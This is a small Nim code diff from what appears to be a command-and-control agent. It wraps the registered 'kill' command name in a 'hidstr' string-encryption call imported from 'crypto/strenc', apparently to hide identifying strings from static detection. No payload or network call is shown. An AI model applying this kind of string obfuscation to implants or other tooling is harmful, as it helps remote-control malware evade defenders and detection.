@@ -1,6 +1,7 @@
 import std/[json, osproc, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc killExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
@@ -35,4 +36,4 @@ proc killExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initKill*() =
-  register("kill", killExecute)
+  register(hidstr("kill"), killExecute)
